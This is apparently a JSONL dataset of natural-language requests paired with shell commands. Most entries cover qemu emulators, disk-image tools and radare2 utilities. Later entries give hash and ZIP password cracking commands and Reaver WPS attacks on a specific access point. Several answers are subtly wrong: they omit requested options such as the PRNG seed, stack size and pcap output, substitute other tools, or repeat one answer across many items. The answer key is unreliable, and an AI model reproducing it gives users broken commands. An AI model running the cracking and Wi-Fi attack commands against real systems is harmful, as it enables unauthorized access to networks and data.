{"input": "Run an ARM big-endian binary \"app\" with a reserved virtual address space of 256MB", "answer": "qemu-armeb-static -R 268435456 ./app"}
{"input": "Run an ARM big-endian binary \"program\" with one guest instruction per emulated translation block", "answer": "qemu-armeb-static -one-insn-per-tb ./program"}
{"input": "Execute an ARM big-endian binary \"app\" with a custom argv[0] value set to `custom_argv0`", "answer": "qemu-armeb-static -0 custom_argv0 ./app"}
{"input": "Execute an ARM ELF binary named `app` with a custom ELF interpreter prefix set to `/custom/path`", "answer": "qemu-armel-static -L /custom/path ./app"}
{"input": "Run an ARM ELF binary named `debug_app` and log all system calls to the console", "answer": "qemu-armel-static -strace ./debug_app"}
{"input": "Run an ARM ELF binary named `example` with the guest base address set to `0x10000000`", "answer": "qemu-armel-static -B 0x10000000 ./example"}
{"input": "Run an ARM ELF binary named `test_app` with one guest instruction per emulated translation block", "answer": "qemu-armel-static -one-insn-per-tb ./test_app"}
{"input": "Run an ARM ELF binary named `debug` with logging enabled for memory operations and CPU state", "answer": "qemu-armel-static -d cpu,mem ./debug"}
{"input": "Execute an ARM ELF binary named `program` with a seed value of `12345` for the pseudo-random number generator", "answer": "qemu-armel-static ./program"}
{"input": "Run an ARM ELF binary named `example` with the `argv[0]` value forced to `custom_name`", "answer": "qemu-armel-static -0 custom_name ./example"}
{"input": "Execute an ARM ELF binary named `program` with a reserved virtual address space of 256 MB", "answer": "qemu-armel-static -R 268435456 ./program"}
{"input": "Run an ARM binary named `app` with the `LD_PRELOAD` environment variable unset for the target process", "answer": "env -u LD_PRELOAD qemu-armhf-static ./app"}
{"input": "Execute an ARM binary named `example` and wait for a GDB connection on port 1234", "answer": "qemu-armhf-static -g 1234 ./example"}
{"input": "Execute an ARM binary named `app` and enable logging for memory operations", "answer": "qemu-armhf-static -d mem ./app"}
{"input": "Create a Debian Bullseye root filesystem for the ARM architecture using qemu-debootstrap, and place it in the directory `/mnt/debian-arm`", "answer": "qemu-debootstrap --arch=armhf bullseye /mnt/debian-arm http://deb.debian.org/debian"}
{"input": "Build a Debian Buster root filesystem for the PowerPC architecture in `/srv/ppc-root` and exclude the `systemd` package from installation", "answer": "qemu-debootstrap --arch=powerpc --exclude=systemd buster /srv/ppc-root http://deb.debian.org/debian"}
{"input": "Generate a Debian Stable root filesystem for the RISC-V architecture in `/var/lib/riscv-root` and include the `vim` and `curl` packages during installation", "answer": "qemu-debootstrap --arch=riscv64 --include=vim,curl stable /var/lib/riscv-root http://deb.debian.org/debian"}
{"input": "Set up a Debian Unstable root filesystem for the ARM64 architecture in `/tmp/arm64-unstable` and skip the second-stage bootstrap process", "answer": "qemu-debootstrap --arch=arm64 --foreign unstable /tmp/arm64-unstable http://deb.debian.org/debian"}
{"input": "Create a Debian Oldstable root filesystem for the x86 architecture in `/root/x86-oldstable` and use a custom keyring file located at `/etc/apt/trusted.gpg.d/custom-keyring.gpg`", "answer": "qemu-debootstrap --arch=i386 --keyring=/etc/apt/trusted.gpg.d/custom-keyring.gpg oldstable /root/x86-oldstable http://deb.debian.org/debian"}
{"input": "Emulate a Hexagon program with one guest instruction per translated block and display version information", "answer": "qemu-hexagon-static --version -one-insn-per-tb ./hexagon_program"}
{"input": "Emulate a Hexagon program with a custom GDB port and unset the `LD_PRELOAD` environment variable", "answer": "qemu-hexagon-static -g 1234 -U LD_PRELOAD ./hexagon_program"}
{"input": "Run a program named `my_program` and set the environment variable `DEBUG=1` for the target process using `qemu-hppa-static`", "answer": "qemu-hppa-static -E DEBUG=1 ./my_program"}
{"input": "Run a program named `my_program` and enable logging for specific items using `qemu-hppa-static`", "answer": "qemu-hppa-static -d cpu,exec ./my_program"}
{"input": "Run a program named `my_program` and enable tracing for specific events defined in `events.txt` using `qemu-hppa-static`", "answer": "qemu-hppa-static -trace events=events.txt ./my_program"}
{"input": "Run a 32-bit Linux binary named `test_app` with a custom ELF interpreter prefix set to `/custom/path`", "answer": "qemu-i386-static -L /custom/path ./test_app"}
{"input": "Run a 32-bit Linux binary named `my_app` with the environment variable `DEBUG=1` set and unset the `LD_PRELOAD` variable", "answer": "qemu-i386-static -E DEBUG=1 -U LD_PRELOAD ./my_app"}
{"input": "Run a 32-bit Linux binary named `my_program` with logging enabled for CPU and memory operations, writing logs to `logfile.txt`", "answer": "qemu-i386-static -d cpu,mem -D logfile.txt ./my_program"}
{"input": "Run a 32-bit Linux binary named `my_program` with a custom uname release string set to `custom_release`", "answer": "qemu-i386-static -r custom_release ./my_program"}
{"input": "Run a 32-bit Linux binary named `my_program` with a custom CPU model set to `core2duo`", "answer": "qemu-i386-static -cpu core2duo ./my_program"}
{"input": "Run a 32-bit Linux binary named `my_app` with a reserved virtual address space of 256MB", "answer": "qemu-i386-static -R 268435456 ./my_app"}
{"input": "Run a 32-bit Linux binary named `my_program` with a custom host page size of 4096 bytes", "answer": "qemu-i386-static -p 4096 ./my_program"}
{"input": "Run a 32-bit Linux binary named `my_app` with one guest instruction per emulated translation block", "answer": "qemu-i386-static -one-insn-per-tb ./my_app"}
{"input": "Run a 32-bit Linux binary named `my_app` with a custom argv[0] set to `custom_argv0`", "answer": "qemu-i386-static -0 custom_argv0 ./my_app"}
{"input": "Emulate a program named `test_app` with the CPU model `Loongson-3A5000` using qemu-loong64-static", "answer": "qemu-loong64-static -cpu Loongson-3A5000 ./test_app"}
{"input": "Run a program named `app` with qemu-loong64-static, setting the environment variable `DEBUG=1` and unsetting `LD_PRELOAD`", "answer": "qemu-loong64-static -E DEBUG=1 -U LD_PRELOAD ./app"}
{"input": "Run a program named `my_program` with the LoongArch64 emulator, setting the stack size to 16MB and using a custom ELF interpreter prefix located at `/custom/path`", "answer": "qemu-loongarch64-static -L /custom/path my_program"}
{"input": "Run a program named `test_app` with the LoongArch64 emulator, setting the environment variable `DEBUG=1` and unsetting the `LD_PRELOAD` variable", "answer": "qemu-loongarch64-static -E DEBUG=1 -U LD_PRELOAD test_app"}
{"input": "Run a program named `app` with the LoongArch64 emulator, enabling logging for memory operations and writing the logs to `memory_log.txt`", "answer": "qemu-loongarch64-static -d mem -D memory_log.txt app"}
{"input": "Run a program named `my_program` with the LoongArch64 emulator, forcing the `argv[0]` to be `custom_name` and setting the QEMU uname release string to `custom_release`", "answer": "qemu-loongarch64-static -0 custom_name -r custom_release my_program"}
{"input": "Emulate a program named `my_app` with qemu-m68k-static, setting the environment variable `DEBUG=1` and unsetting the `LD_PRELOAD` variable", "answer": "qemu-m68k-static -E DEBUG=1 -U LD_PRELOAD ./my_app"}
{"input": "Run a program named `example` with qemu-m68k-static, enabling logging for CPU and memory operations, and writing the logs to a file named `qemu_log.txt`", "answer": "qemu-m68k-static -d cpu,mem -D qemu_log.txt ./example"}
{"input": "Run a program named `binary` with qemu-m68k-static, enabling system call logging and generating a JIT dump file for performance analysis", "answer": "qemu-m68k-static -strace -jitdump ./binary"}
{"input": "Emulate a program named `app` with qemu-m68k-static, setting the ELF interpreter prefix to `/custom/path` and using a seed of `12345` for the pseudo-random number generator", "answer": "qemu-m68k-static -L /custom/path ./app"}
{"input": "Run a program named `test` with qemu-m68k-static, enabling tracing for all events and writing the trace output to `trace.log`", "answer": "qemu-m68k-static -trace enable=*,file=trace.log ./test"}
{"input": "Run a program named `example` using `qemu-microblaze-static` with a guest base address of `0x10000000` and reserve 256 MB of virtual address space for the guest", "answer": "qemu-microblaze-static -B 0x10000000 -R 268435456 ./example"}
{"input": "Execute a program named `demo` using `qemu-microblaze-static` with logging enabled for memory operations and write the logs to a file named `log.txt`", "answer": "qemu-microblaze-static -d mem -D log.txt ./demo"}
{"input": "Run a program named `app` with the QEMU microblazeel emulator, logging all system calls to the console", "answer": "qemu-microblazeel-static -strace ./app"}
{"input": "Run a program named `test` with the QEMU microblazeel emulator, enabling logging for CPU and memory operations and writing the logs to a file named `qemu.log`", "answer": "qemu-microblazeel-static -d cpu,mem -D qemu.log ./test"}
{"input": "Emulate a MIPS binary named `app` with a custom ELF interpreter prefix `/custom/path` and log all system calls to the terminal", "answer": "qemu-mips-static -L /custom/path -strace ./app"}
{"input": "Run a MIPS binary named `binary` with logging enabled for memory operations and write the logs to a file named `qemu.log`", "answer": "qemu-mips-static -d mem -D qemu.log ./binary"}
{"input": "Emulate a MIPS binary named `test` with a custom uname release string `custom-release` and force the target process's `argv[0]` to be `custom_name`", "answer": "qemu-mips-static -r custom-release -0 custom_name ./test"}
{"input": "Emulate a MIPS64 binary named `app` with the CPU model set to `MIPS64R6-generic` and log all system calls to the console", "answer": "qemu-mips64-static -cpu MIPS64R6-generic -strace ./app"}
{"input": "Emulate a MIPS64el binary named `app` with a custom ELF interpreter prefix `/custom/lib` and set the environment variable `DEBUG=1` for the target process", "answer": "qemu-mips64el-static -L /custom/lib -E DEBUG=1 ./app"}
{"input": "Emulate a MIPS64el binary named `test` with a custom page size of 4096 bytes and force the target process's `argv[0]` to be `custom_name`", "answer": "qemu-mips64el-static -p 4096 -0 custom_name ./test"}
{"input": "Emulate a MIPS64el binary named `monitor` with a custom GDB connection port `1234` and unset the environment variable `LD_PRELOAD` for the target process", "answer": "qemu-mips64el-static -g 1234 -U LD_PRELOAD ./monitor"}
{"input": "Run a MIPS ELF binary named `test_program` and set the environment variable `DEBUG=1` for the target process", "answer": "qemu-mipsel-static -E DEBUG=1 ./test_program"}
{"input": "Run a MIPS ELF binary named `test_program` and log all system calls to the console", "answer": "qemu-mipsel-static -strace ./test_program"}
{"input": "Run a MIPS ELF binary named `test_program` and log all memory access operations to a file named `memory_log.txt`", "answer": "qemu-mipsel-static -d mem -D memory_log.txt ./test_program"}
{"input": "Run a MIPS ELF binary named `test_program` and set the guest base address to `0x10000000`", "answer": "qemu-mipsel-static -B 0x10000000 ./test_program"}
{"input": "Run a MIPS ELF binary named `test_program` and reserve 256 MB of virtual address space for the guest", "answer": "qemu-mipsel-static -R 268435456 ./test_program"}
{"input": "Run a MIPS ELF binary named `test_program` and display the version information of `qemu-mipsel-static`", "answer": "qemu-mipsel-static -version && qemu-mipsel-static ./test_program"}
{"input": "Run a MIPS ELF binary named `test_program` with a custom ELF interpreter prefix located at `/custom/path`", "answer": "qemu-mipsel-static -L /custom/path ./test_program"}
{"input": "Run a MIPS ELF binary named `test_program` and force the target process's `argv[0]` to be `custom_name`", "answer": "qemu-mipsel-static -0 custom_name ./test_program"}
{"input": "Run a MIPS ELF binary named `test_program` and set the QEMU uname release string to `custom_release`", "answer": "qemu-mipsel-static -r custom_release ./test_program"}
{"input": "Run a MIPS ELF binary named `test_program` and enable logging of CPU and memory operations", "answer": "qemu-mipsel-static -d cpu,mem ./test_program"}
{"input": "Run a MIPS N32 binary named \"my_app\" with the CPU model set to \"24Kc\" and log all system calls to the console", "answer": "qemu-mipsn32-static -cpu 24Kc -strace ./my_app"}
{"input": "Run a MIPS N32 binary named \"analyze\" with logging enabled for memory access and write the logs to a file named \"log.txt\"", "answer": "qemu-mipsn32-static -d mem -D log.txt ./analyze"}
{"input": "Run a MIPS N32 binary named \"program\" with the environment variable \"LOG_LEVEL=debug\" set and unset the environment variable \"LD_PRELOAD\"", "answer": "qemu-mipsn32-static -E LOG_LEVEL=debug -U LD_PRELOAD ./program"}
{"input": "Debug a MIPS N32 little-endian binary named `debug_me` by waiting for a GDB connection on port 1234 and setting the ELF interpreter prefix to `/custom/path`", "answer": "qemu-mipsn32el-static -g 1234 -L /custom/path ./debug_me"}
{"input": "Execute a MIPS N32 little-endian binary named `my_app` with the CPU model set to `24Kc` and log all system calls to the console", "answer": "qemu-mipsn32el-static -cpu 24Kc -strace ./my_app"}
{"input": "Execute a MIPS N32 little-endian binary named `app` with logging enabled for memory operations and write the logs to a file named `log.txt`", "answer": "qemu-mipsn32el-static -d mem -D log.txt ./app"}
{"input": "Run a MIPS N32 little-endian binary named `test` with the QEMU uname release string set to `custom_release` and force the target process's `argv[0]` to be `custom_name`", "answer": "qemu-mipsn32el-static -r custom_release -0 custom_name ./test"}
{"input": "Run a MIPS N32 little-endian binary named `binary` with one guest instruction per emulated translation block and enable tracing for specific events defined in `events.txt`", "answer": "qemu-mipsn32el-static -one-insn-per-tb -trace events=events.txt ./binary"}
{"input": "Execute a MIPS N32 little-endian binary named `app` with the host page size set to 4096 bytes and unset the `LD_PRELOAD` environment variable for the target process", "answer": "qemu-mipsn32el-static -p 4096 -U LD_PRELOAD ./app"}
{"input": "Run a program using qemu-or1k-static with a custom ELF interpreter prefix `/custom/lib` and unset the `LD_PRELOAD` environment variable", "answer": "qemu-or1k-static -L /custom/lib -U LD_PRELOAD ./my_program"}
{"input": "Run a program using qemu-or1k-static with a custom CPU model `or1200` and log all memory access operations", "answer": "qemu-or1k-static -cpu or1200 -d mem ./my_program"}
{"input": "Run a program using qemu-or1k-static with a custom log file `output.log` and enable logging of CPU state changes", "answer": "qemu-or1k-static -D output.log -d cpu ./my_program"}
{"input": "Run a PowerPC binary named `program` with the environment variable `DEBUG=1` set and `LD_PRELOAD` unset using `qemu-powerpc-static`", "answer": "qemu-powerpc-static -E DEBUG=1 -U LD_PRELOAD ./program"}
{"input": "Run a PowerPC binary named `test` with a custom reserved virtual address space size of 256MB using `qemu-powerpc-static`", "answer": "qemu-powerpc-static -R 268435456 ./test"}
{"input": "Emulate a PowerPC binary named `server` with the `LD_PRELOAD` environment variable unset using `qemu-ppc-static`", "answer": "qemu-ppc-static -U LD_PRELOAD ./server"}
{"input": "Emulate a PowerPC binary named `binary` with a reserved virtual address space of 256MB using `qemu-ppc-static`", "answer": "qemu-ppc-static -R 268435456 ./binary"}
{"input": "Emulate a PowerPC binary named `app` with one guest instruction per emulated translation block using `qemu-ppc-static`", "answer": "qemu-ppc-static -one-insn-per-tb ./app"}
{"input": "Emulate a PowerPC binary named `test` with a custom perf map file generated using `qemu-ppc-static`", "answer": "qemu-ppc-static -perfmap perf.map ./test"}
{"input": "Run a PowerPC 64-bit program with a custom ELF interpreter prefix and wait for a GDB connection on port 1234", "answer": "qemu-ppc64-static -L /custom/prefix -g 1234 ./my_program"}
{"input": "Run a PowerPC 64-bit Little Endian (ppc64le) binary named `app` with the environment variable `DEBUG=1` set and `LD_PRELOAD` unset", "answer": "qemu-ppc64el-static -E DEBUG=1 -U LD_PRELOAD ./app"}
{"input": "Emulate a ppc64le binary named `test_app` with a custom ELF interpreter prefix `/custom/lib` and log all system calls to the console", "answer": "qemu-ppc64le-static -L /custom/lib -strace ./test_app"}
{"input": "Debug a ppc64le binary named `debug_me` by waiting for a GDB connection on port 1234 and logging all memory access operations", "answer": "qemu-ppc64le-static -g 1234 -d mem ./debug_me"}
{"input": "Run a RISC-V 32-bit program named `app` with a custom ELF interpreter prefix `/custom/path` and wait for a GDB connection on port 1234", "answer": "qemu-riscv32-static -L /custom/path -g 1234 ./app"}
{"input": "Execute a RISC-V 32-bit program named `demo` with a reserved virtual address space of 256MB and log all events to a file named `log.txt`", "answer": "qemu-riscv32-static -R 268435456 -D log.txt ./demo"}
{"input": "Execute a RISC-V 64-bit program named `app` with the CPU model `rv64gc` and log all system calls to the console", "answer": "qemu-riscv64-static -cpu rv64gc -strace ./app"}
{"input": "Execute a RISC-V 64-bit program named `binary` with logging enabled for memory operations and write the logs to a file named `log.txt`", "answer": "qemu-riscv64-static -d mem -D log.txt ./binary"}
{"input": "Emulate a program named `test_app` with the s390x architecture, setting the environment variable `DEBUG=1` and unsetting the `LD_PRELOAD` variable", "answer": "qemu-s390x-static -E DEBUG=1 -U LD_PRELOAD ./test_app"}
{"input": "Emulate a program named `app` with the s390x architecture, reserving 256MB of virtual address space for the guest", "answer": "qemu-s390x -m 256M ./app"}
{"input": "Run a program named `test` with the s390x emulator, enabling logging for memory operations and writing the logs to a file named `log.txt`", "answer": "qemu-s390x-static -d mem -D log.txt ./test"}
{"input": "Emulate a SH4 program while waiting for a GDB connection on port 1234 and log system calls", "answer": "qemu-sh4-static -g 1234 -strace ./my_program"}
{"input": "Emulate a SH4 program with a specific CPU model and log all memory accesses", "answer": "qemu-sh4-static -cpu sh7750 -d mem ./my_program"}
{"input": "Run a program named `app` with `qemu-sh4eb-static`, unset the `LD_PRELOAD` environment variable, and log system calls to the console", "answer": "qemu-sh4eb-static -U LD_PRELOAD -strace ./app"}
{"input": "Emulate a program named `binary` with `qemu-sh4eb-static`, set the CPU model to `sh4`, and reserve 256MB of virtual address space for the guest", "answer": "qemu-sh4eb-static -cpu sh4 -R 268435456 ./binary"}
{"input": "Emulate a program named `app` with `qemu-sh4eb-static`, enable tracing of specific events defined in `events.txt`, and write the trace output to `trace.log`", "answer": "qemu-sh4eb-static -trace events=events.txt,file=trace.log ./app"}
{"input": "Emulate a SPARC binary named `calc` with a custom guest base address `0x10000000` and reserve 256MB of virtual address space for the guest", "answer": "qemu-sparc-static -B 0x10000000 -R 268435456 ./calc"}
{"input": "Run a SPARC binary named `logger` with logging enabled for CPU and memory operations, and write the logs to a file named `log.txt`", "answer": "qemu-sparc-static -d cpu,mem -D log.txt ./logger"}
{"input": "Run a SPARC binary named `app` with a custom host page size of 4096 bytes and unset the environment variable `LD_PRELOAD` for the target process", "answer": "qemu-sparc-static -p 4096 -U LD_PRELOAD ./app"}
{"input": "Emulate a SPARC32+ binary named \"app\" with the CPU model \"TI SuperSparc\" and log all system calls to the console", "answer": "qemu-sparc32plus-static -cpu TI_SuperSparc -strace ./app"}
{"input": "Run a SPARC32+ binary named \"example\" with a custom ELF interpreter prefix \"/custom/lib\" and unset the environment variable \"LD_PRELOAD\" for the target process", "answer": "qemu-sparc32plus-static -L /custom/lib -U LD_PRELOAD ./example"}
{"input": "Execute a SPARC64 binary named `my_app` with the CPU model set to `UltraSparcIII` and log all system calls to the console", "answer": "qemu-sparc64-static -cpu UltraSparcIII -strace ./my_app"}
{"input": "Execute a SPARC64 binary named `app` with logging enabled for memory operations and write the logs to a file named `log.txt`", "answer": "qemu-sparc64-static -d mem -D log.txt ./app"}
{"input": "Run a SPARC64 binary named `test` with a custom uname release string of `CustomOS 1.0` and force the target process's `argv[0]` to be `custom_name`", "answer": "qemu-sparc64-static -r CustomOS\\ 1.0 -0 custom_name ./test"}
{"input": "Execute a program named `env_test` with the environment variable `DEBUG=1` set and `LD_PRELOAD` unset using `qemu-x86_64-static`", "answer": "qemu-x86_64-static -E DEBUG=1 -U LD_PRELOAD ./env_test"}
{"input": "Execute a program named `trace_test` with tracing enabled for system calls and write the trace to `trace.log` using `qemu-x86_64-static`", "answer": "qemu-x86_64-static -strace -D trace.log ./trace_test"}
{"input": "Run a program named `reserved_test` with 512MB of reserved virtual address space using `qemu-x86_64-static`", "answer": "qemu-x86_64-static -R 536870912 ./reserved_test"}
{"input": "Run a program named `argv_test` with the `argv[0]` value forced to `custom_name` using `qemu-x86_64-static`", "answer": "qemu-x86_64-static -0 custom_name ./argv_test"}
{"input": "Run a program compiled for xtensaeb architecture with a custom ELF interpreter prefix `/custom/lib` and unset the `LD_PRELOAD` environment variable", "answer": "qemu-xtensaeb-static -L /custom/lib -U LD_PRELOAD ./my_program"}
{"input": "Create a new raw disk image named `new_disk.img` with a size of 10GB", "answer": "qemu-img create -f raw new_disk.img 10G"}
{"input": "Compare the contents of two disk images, `image1.qcow2` and `image2.qcow2`", "answer": "qemu-img compare image1.qcow2 image2.qcow2"}
{"input": "Rebase the disk image `child.qcow2` to use a new backing file `new_base.qcow2`", "answer": "qemu-img rebase -b new_base.qcow2 child.qcow2"}
{"input": "Update the disk image `disk.qcow2` to use a new cluster size of 64KB", "answer": "qemu-img amend -f qcow2 -o cluster_size=64k disk.qcow2"}
{"input": "Disconnect the local NBD device `/dev/nbd0` from the QEMU NBD server", "answer": "qemu-nbd -d /dev/nbd0"}
{"input": "Expose a QEMU disk image `vm.qcow2` with the process ID stored in `/var/run/qemu-nbd.pid` and fork the server process", "answer": "qemu-nbd --pid-file=/var/run/qemu-nbd.pid --fork vm.qcow2"}
{"input": "Export a block node named `disk1` as a vhost-user-blk device over a UNIX domain socket at `/tmp/vhost.sock` and set the logical block size to 512 bytes", "answer": "qemu-storage-daemon --export type=vhost-user-blk,id=vhost1,node-name=disk1,addr.type=unix,addr.path=/tmp/vhost.sock,logical-block-size=512"}
{"input": "Export a block node named `disk1` as a vduse-blk device with the name `vduse_disk1` and set the queue size to 128", "answer": "qemu-storage-daemon --export type=vduse-blk,id=vduse1,node-name=disk1,name=vduse_disk1,queue-size=128"}
{"input": "Analyze the APK file \"test.apk\" using Quark, generate a JSON output report, and use the custom rules located in \"/custom/rules\"", "answer": "quark -a test.apk -o report.json -r /custom/rules"}
{"input": "Compare behaviors based on the maximum confidence of rule labels for the APK file \"example.apk\" using Quark", "answer": "quark -a example.apk -C"}
{"input": "Analyze the APK file \"old.apk\" using Quark with the Rizin core library and allow multi-processing with 4 processes", "answer": "quark -a old.apk --core-library rizin --multi-process 4"}
{"input": "Open the binary file \"example.bin\" in radare2, set the architecture to x86, and analyze all referenced code", "answer": "r2 -a x86 -A example.bin"}
{"input": "Open the binary file \"example.bin\" in radare2, set the architecture to arm, the bit size to 32, and analyze all referenced code", "answer": "r2 -a arm -b 32 -A example.bin"}
{"input": "Open the binary file \"example.bin\" in radare2, run a custom script \"analysis.r2\" before opening the file, and analyze all referenced code", "answer": "r2 -I analysis.r2 -A example.bin"}
{"input": "Open the binary file \"example.bin\" in radare2, enable sandbox mode, and analyze all referenced code", "answer": "r2 -S -A example.bin"}
{"input": "Open the binary file \"example.bin\" in radare2, do not load any user settings or scripts, and analyze all referenced code", "answer": "r2 -NN -A example.bin"}
{"input": "Run r2agent in sandbox mode, allow connections from everyone, and listen on port 6060", "answer": "r2agent -s -a -p 6060"}
{"input": "Update the Radare2 package database to the latest version", "answer": "r2pm -U"}
{"input": "Install the package \"r2ghidra\" system-wide using the Radare2 package manager", "answer": "r2pm -gi r2ghidra"}
{"input": "Analyze all referenced code in the binary file `example.bin` using radare2", "answer": "radare2 -A example.bin"}
{"input": "Debug the running process with PID `1234` using radare2", "answer": "radare2 -d 1234"}
{"input": "Open the binary file `example.bin` in radare2 and execute the command `pd 10` to disassemble the first 10 instructions", "answer": "radare2 -c \"pd 10\" example.bin"}
{"input": "Open the binary file `example.bin` in radare2 and run the script `analysis.r2` before opening the file", "answer": "radare2 -I analysis.r2 example.bin"}
{"input": "Open the binary file `example.bin` in radare2 and map it at the address `0x200000`", "answer": "radare2 -m 0x200000 example.bin"}
{"input": "Open the binary file `example.bin` in radare2 and do not load any user settings or scripts", "answer": "radare2 -N example.bin"}
{"input": "Open the binary file `example.bin` in radare2 and set the configuration variable `asm.arch` to `arm`", "answer": "radare2 -e asm.arch=arm example.bin"}
{"input": "Open the binary file `example.bin` in radare2 and do not load RBin information", "answer": "radare2 -n example.bin"}
{"input": "Open the binary file `example.bin` in radare2 and load the plugin `myplugin.so`", "answer": "radare2 -l myplugin.so example.bin"}
{"input": "Analyze the differences between `binaryA` and `binaryB` and display the results in JSON format", "answer": "radiff2 -j binaryA binaryB"}
{"input": "Perform a delta diffing analysis on `file1` and `file2` to identify byte-level changes", "answer": "radiff2 -d file1 file2"}
{"input": "Compare `binaryA` and `binaryB` and output the results in radare2 commands format", "answer": "radiff2 -r binaryA binaryB"}
{"input": "Compare `binaryA` and `binaryB` and output the differences in a two-column hexdump format", "answer": "radiff2 -x binaryA binaryB"}
{"input": "Search for the string \"password\" in the file \"secret.txt\" and display all occurrences without showing headings or filenames", "answer": "grep -o \"password\" secret.txt"}
{"input": "Search for zero-terminated strings in the directory \"logs/\" and output the results in JSON format", "answer": "rafind2 -z -j logs/"}
{"input": "Perform a magic search to identify file types in the directory \"unknown_files/\" and continue searching even if read errors occur", "answer": "find unknown_files/ -type f -exec file {} \\; 2>/dev/null"}
{"input": "Calculate the SHA1 hash of the string \"Hello, World!\" and output the result in JSON format", "answer": "rahash2 -a sha1 -s \"Hello, World!\" -j"}
{"input": "Calculate the MD5 hash of the hex string \"4a4b4c4d\" and output the result in hexpair format", "answer": "rahash2 -a md5 -x 4a4b4c4d -X"}
{"input": "Calculate the HMAC-SHA1 hash of the file \"message.txt\" using the key \"supersecretkey\"", "answer": "rahash2 -a hmac-sha1 -S supersecretkey message.txt"}
{"input": "Calculate the MD5 hash of the file \"logfile.log\" and output the result in radare2 command format", "answer": "rahash2 -a md5 -r logfile.log"}
{"input": "Execute a program `/bin/bash` with a custom environment, set the user ID to 2000, and preload the library `/lib/libfoo.so`", "answer": "rarun2 program=/bin/bash setuid=2000 preload=/lib/libfoo.so"}
{"input": "Generate signatures from `libc.so.6` and save them under the signspace `libc` in the file `libc.sdb`", "answer": "rasign2 -s libc -o libc.sdb libc.so.6"}
{"input": "Perform a deep analysis on `libexample.so` and generate signatures, saving them to `output.sdb`", "answer": "rasign2 -AAA -o output.sdb libexample.so"}
{"input": "Generate signatures from `libexample.so` and display them in JSON format", "answer": "rasign2 -j libexample.so"}
{"input": "Generate signatures from `libexample.so` and save them to `output.sdb` in quiet mode", "answer": "rasign2 -q -o output.sdb libexample.so"}
{"input": "Disassemble the hex bytes \"31c0\" for a 32-bit x86 architecture", "answer": "rasm2 -a x86 -b 32 -d 31c0"}
{"input": "Assemble the instruction \"mov eax, 0\" for a 64-bit x86 architecture and output the result in C format", "answer": "rasm2 -a x86 -b 64 -C \"mov eax, 0\""}
{"input": "Disassemble the hex bytes \"48c7c001000000\" for a 64-bit x86 architecture and output the result in JSON format", "answer": "rasm2 -a x86 -b 64 -d -j 48c7c001000000"}
{"input": "Assemble the instruction \"ret\" for a 64-bit x86 architecture and output the result in radare2 command format", "answer": "rasm2 -a x86 -b 64 -r \"ret\""}
{"input": "Convert the octal number `52` to its hexadecimal representation", "answer": "rax2 -o 52"}
{"input": "Convert the hexadecimal value `0x2a` to its binary representation", "answer": "rax2 -b 0x2a"}
{"input": "Encode the string `\"hello\"` to base64", "answer": "echo -n \"hello\" | base64"}
{"input": "Convert the IP address `192.168.1.1` to its long integer representation", "answer": "rax2 -i 192.168.1.1"}
{"input": "Convert the string `\"hello\"` to its binary representation", "answer": "echo -n \"hello\" | xxd -b"}
{"input": "Crack multiple hashes listed in a file named `mixed_hashes.txt` using rainbow tables stored in the `/mixed_tables` directory", "answer": "rcrack /mixed_tables -l mixed_hashes.txt"}
{"input": "Convert the rainbow table stored in `table.rt` to a new format and save it as `converted_table.rtc`", "answer": "rt2rtc -i table.rt -o converted_table.rtc"}
{"input": "Benchmark the performance of generating a rainbow table for SHA1 hashes using a mixed alphanumeric character set, with plaintext lengths ranging from 1 to 10, and table index 1", "answer": "rtgen sha1 mixalpha-numeric 1 10 1 -bench"}
{"input": "Benchmark the performance of generating a rainbow table for LM hashes using a lowercase alphabetic character set, with plaintext lengths ranging from 1 to 7, and table index 4", "answer": "rtgen lm loweralpha 1 7 4 -bench"}
{"input": "Benchmark the performance of generating a rainbow table for SHA1 hashes using a lowercase alphabetic character set, with plaintext lengths ranging from 2 to 6, and table index 6", "answer": "rtgen sha1 loweralpha 2 6 6 -bench"}
{"input": "Generate a rainbow table for SHA256 hashes using a mixed alphanumeric character set, with plaintext lengths ranging from 5 to 12, table index 8, chain length 4000, chain number 1200, and part index 5", "answer": "rtgen sha256 mixalpha-numeric 5 12 8 4000 1200 5"}
{"input": "Show all tasks in the Rakefile, including those without descriptions", "answer": "rake -AT"}
{"input": "Display all tasks in the Rakefile, even those that are uncommented, and provide a detailed description of each task", "answer": "rake -AT"}
{"input": "List all tasks in the Rakefile, including those that are not commented, and show their descriptions", "answer": "rake -AT"}
{"input": "I want to see all tasks in the Rakefile, even the ones that don't have descriptions", "answer": "rake -AT"}
{"input": "Display all tasks in the Rakefile, including those without comments, and provide a description for each", "answer": "rake -AT"}
{"input": "I need to see all tasks in the Rakefile, including those that are not commented, and get a description for each", "answer": "rake -AT"}
{"input": "Show all tasks in the Rakefile, including uncommented ones, and describe them", "answer": "rake -AT"}
{"input": "Crack the encrypted ZIP file `data.zip` using the default number of threads", "answer": "fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt data.zip"}
{"input": "Crack all hashes in `hashes.txt` using the rainbow tables in `/rainbow_tables` and ignore any false alarms", "answer": "rcracki_mt -d /rainbow_tables -f hashes.txt"}
{"input": "Connect to a remote desktop at IP 192.168.3.100 with the username \"alice\", password \"alicePass\", and enable RDP compression to optimize performance over a slow network", "answer": "rdesktop -u alice -p alicePass -z 192.168.3.100"}
{"input": "Display the file version information from the PE resource directory of the file \"explorer.exe\"", "answer": "peres -v explorer.exe"}
{"input": "Show statistics about the resources in the PE file \"calc.exe\" in an HTML format", "answer": "peres -s --format html calc.exe"}
{"input": "Analyze the PE file `suspicious.dll` with pescan and provide detailed information about any suspicious findings", "answer": "pescan -v suspicious.dll"}
{"input": "Display all available information about the PE file \"example.exe\" using readpe", "answer": "readpe --all example.exe"}
{"input": "Use Reaver to attack the access point with BSSID `00:90:4C:C1:AC:21` on channel 6, disable channel hopping, and set a delay of 5 seconds between pin attempts.\"", "answer": "reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -c 6 -f -d 5"}
{"input": "Use Reaver to attack the access point with BSSID `00:90:4C:C1:AC:21`, set a timeout of 15 seconds for receiving responses, and write packets of interest to a file named `output.pcap`.\"", "answer": "reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -t 15"}
{"input": "Run Reaver on the monitor interface `wlan0mon` targeting the access point with BSSID `00:90:4C:C1:AC:21`, and mimic a Windows 7 registrar during the attack.\"", "answer": "reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -w"}
{"input": "Use Reaver to attack the access point with BSSID `00:90:4C:C1:AC:21`, and sleep for 10 seconds every 5 pin attempts.\"", "answer": "reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -r 5:10"}
